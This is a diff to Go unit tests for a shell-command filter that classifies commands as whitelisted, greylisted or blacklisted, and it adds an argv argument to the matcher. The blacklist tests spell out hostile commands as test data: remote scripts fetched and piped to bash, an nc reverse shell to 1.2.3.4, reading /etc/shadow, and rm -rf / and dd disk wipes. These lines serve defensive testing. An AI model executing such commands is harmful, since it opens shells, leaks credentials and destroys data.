@@ -2,7 +2,6 @@ package filter
 
 import (
 	"regexp"
-	"strings"
 	"testing"
 )
 
@@ -12,27 +11,26 @@ func TestWhitelistPattern(t *testing.T) {
 	tests := []struct {
 		cmd      string
 		filenames []string
+		argv     string
 		want     Result
 	}{
-		{"ls", nil, Whitelisted},
-		{"ls -la", nil, Whitelisted},
-		{"pwd", nil, Whitelisted},
-		{"cd /tmp", nil, Whitelisted},
-		{"echo hello", nil, Whitelisted},
-		{"cat", []string{"/var/log/syslog"}, Whitelisted},
-		{"cat", []string{"/etc/config.yaml"}, Whitelisted},
-		{"ps aux", nil, Whitelisted},
-		{"grep 'error'", []string{"/var/log/app.log"}, Whitelisted},
-		{"tar -xzf archive.tar.gz", nil, Whitelisted},
-		{"ssh user@host `ls`", nil, Greylisted}, // backticks make it suspicious
+		{"ls", nil, "", Whitelisted},
+		{"ls -la", nil, "", Whitelisted},
+		{"pwd", nil, "", Whitelisted},
+		{"cd /tmp", nil, "", Whitelisted},
+		{"echo hello", nil, "", Whitelisted},
+		{"cat", []string{"/var/log/syslog"}, "", Whitelisted},
+		{"cat", []string{"/etc/config.yaml"}, "", Whitelisted},
+		{"ps aux", nil, "", Whitelisted},
+		{"grep 'error'", []string{"/var/log/app.log"}, "", Whitelisted},
+		{"tar -xzf archive.tar.gz", nil, "", Whitelisted},
+		{"ssh user@host `ls`", nil, "", Greylisted}, // backticks make it suspicious
 	}
 
 	for _, tt := range tests {
-		got, desc := m.Match(tt.cmd, tt.filenames)
+		got, desc := m.Match(tt.cmd, tt.filenames, tt.argv)
 		if got != tt.want {
-			// Debug: show what target string looks like
-			target := strings.TrimSpace(tt.cmd + " " + strings.Join(tt.filenames, " "))
-			t.Errorf("Match(%q, %v) = %v (%s), want %v. Target: %q", tt.cmd, tt.filenames, got, desc, tt.want, target)
+			t.Errorf("Match(%q, %v, %q) = %v (%s), want %v", tt.cmd, tt.filenames, tt.argv, got, desc, tt.want)
 		}
 	}
 }
@@ -43,24 +41,24 @@ func TestBlacklistPattern(t *testing.T) {
 	tests := []struct {
 		cmd      string
 		filenames []string
+		argv     string
 		want     Result
 	}{
-		{"cat /etc/shadow", nil, Blacklisted},
-		{"wget http://1.2.3.4/script.sh | bash", nil, Blacklisted},
-		{"curl http://1.2.3.4/script.sh | bash", nil, Blacklisted},
-		{"nc -e /bin/bash 1.2.3.4 4444", nil, Blacklisted},
-		{"/dev/tcp/1.2.3.4/4444", nil, Blacklisted},
-		{"nmap -sS -p 1-1000 target", nil, Blacklisted},
-		{"chmod 4777 /bin/su", nil, Blacklisted},
-		{"rm -rf /", nil, Blacklisted},
-		{"dd if=/dev/zero of=/dev/sda", nil, Blacklisted},
+		{"cat", []string{"/etc/shadow"}, "", Blacklisted},
+		{"wget", nil, "http://1.2.3.4/script.sh | bash", Blacklisted},
+		{"curl", nil, "http://1.2.3.4/script.sh | bash", Blacklisted},
+		{"nc", nil, "-e /bin/bash 1.2.3.4 4444", Blacklisted},
+		{"/dev/tcp/1.2.3.4/4444", nil, "", Blacklisted},
+		{"nmap", nil, "-sS -p 1-1000 target", Blacklisted},
+		{"chmod", nil, "4777 /bin/su", Blacklisted},
+		{"rm", nil, "-rf /", Blacklisted},
+		{"dd", nil, "if=/dev/zero of=/dev/sda", Blacklisted},
 	}
 
 	for _, tt := range tests {
-		got, desc := m.Match(tt.cmd, tt.filenames)
+		got, desc := m.Match(tt.cmd, tt.filenames, tt.argv)
 		if got != tt.want {
-			target := strings.TrimSpace(tt.cmd + " " + strings.Join(tt.filenames, " "))
-			t.Errorf("Match(%q, %v) = %v (%s), want %v. Target: %q", tt.cmd, tt.filenames, got, desc, tt.want, target)
+			t.Errorf("Match(%q, %v, %q) = %v (%s), want %v", tt.cmd, tt.filenames, tt.argv, got, desc, tt.want)
 		}
 	}
 }
@@ -71,26 +69,26 @@ func TestGreylistPattern(t *testing.T) {
 	tests := []struct {
 		cmd      string
 		filenames []string
+		argv     string
 		want     Result
 	}{
-		{"curl http://example.com/api", nil, Greylisted},
-		{"wget http://example.com/file", nil, Greylisted},
-		{"bash -c 'ls'", nil, Greylisted},
-		{"python3 -m http.server 8000", nil, Greylisted},
-		{"sudo ls", nil, Greylisted},
-		{"chmod 755 script.sh", nil, Greylisted},
-		{"chown root:root file", nil, Greylisted},
-		{"useradd newuser", nil, Greylisted},
-		{"passwd username", nil, Greylisted},
-		{"/tmp/malware.sh", []string{"/tmp/malware.sh"}, Greylisted},
-		{"curl http://api.example.com", nil, Greylisted},
+		{"curl", nil, "http://example.com/api", Greylisted},
+		{"wget", nil, "http://example.com/file", Greylisted},
+		{"bash", nil, "-c 'ls'", Greylisted},
+		{"python3", nil, "-m http.server 8000", Greylisted},
+		{"sudo", nil, "ls", Greylisted},
+		{"chmod", nil, "755 script.sh", Greylisted},
+		{"chown", nil, "root:root file", Greylisted},
+		{"useradd", nil, "newuser", Greylisted},
+		{"passwd", nil, "username", Greylisted},
+		{"/tmp/malware.sh", []string{"/tmp/malware.sh"}, "", Greylisted},
+		{"curl", nil, "http://api.example.com", Greylisted},
 	}
 
 	for _, tt := range tests {
-		got, desc := m.Match(tt.cmd, tt.filenames)
+		got, desc := m.Match(tt.cmd, tt.filenames, tt.argv)
 		if got != tt.want {
-			target := strings.TrimSpace(tt.cmd + " " + strings.Join(tt.filenames, " "))
-			t.Errorf("Match(%q, %v) = %v (%s), want %v. Target: %q", tt.cmd, tt.filenames, got, desc, tt.want, target)
+			t.Errorf("Match(%q, %v, %q) = %v (%s), want %v", tt.cmd, tt.filenames, tt.argv, got, desc, tt.want)
 		}
 	}
 }
@@ -99,7 +97,7 @@ func TestDefaultToGreylist(t *testing.T) {
 	m := NewMatcher()
 
 	// Unknown commands should default to greylist
-	result, desc := m.Match("some_unknown_command", nil)
+	result, desc := m.Match("some_unknown_command", nil, "")
 	if result != Greylisted {
 		t.Errorf("expected Greylisted for unknown command, got %v", result)
 	}
@@ -122,7 +120,7 @@ func TestAddPattern(t *testing.T) {
 	// Add a custom whitelist pattern
 	m.AddPattern(regexp.MustCompile("(?i)my-safe-cmd"), "my safe command", Whitelisted)
 
-	result, _ := m.Match("my-safe-cmd", nil)
+	result, _ := m.Match("my-safe-cmd", nil, "")
 	if result != Whitelisted {
 		t.Errorf("expected Whitelisted, got %v", result)
 	}
